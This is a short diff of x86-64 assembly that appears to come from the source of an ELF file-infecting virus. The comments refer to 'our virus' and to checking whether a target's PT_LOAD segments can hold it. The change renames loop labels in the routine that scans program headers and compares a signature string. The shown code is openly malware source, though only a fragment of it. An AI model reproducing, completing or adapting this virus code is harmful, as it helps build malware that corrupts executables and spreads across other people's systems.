@@ -191,8 +191,8 @@ _read_file_header_64:
 	jl _munmap
 
 ; now we browse all the segment to find PT_LOAD
-_loop_verif:
-	mov r10, QWORD [rsp + 40] ; take  actual phnum
+_verif_segments:
+	.loop mov r10, QWORD [rsp + 40] ; take  actual phnum
 	cmp r10, QWORD [rsp + 48] ; if phnum >= ehdr->e_phnum
 	jge _munmap
 	mov r10, QWORD [rsp + 32] ; take phdr
@@ -225,7 +225,7 @@ _loop_verif:
 	sub QWORD [rsp + 56], r11
 ;	sub QWORD [rsp + 56], 256
 
-_cmp_offset:
+; Compare offset
 	cmp QWORD [rsp + 56], 0
 	jle _call_mmaped_update ; if our string addr is lower than the mmap addr, so we are out of the file, and this one cant hold our virus
 ; now we have the theoric offset of our string, we need to add this offset on the mmap address
@@ -236,7 +236,7 @@ _cmp_offset:
 _inc_before_reloop:
 	add QWORD [rsp + 32], 56
 	inc QWORD [rsp + 40]
-	jmp _loop_verif
+	jmp _verif_segments.loop
 
 _init_cmp_loop:
 ; here we will compare 8 by 8 bytes of the string 
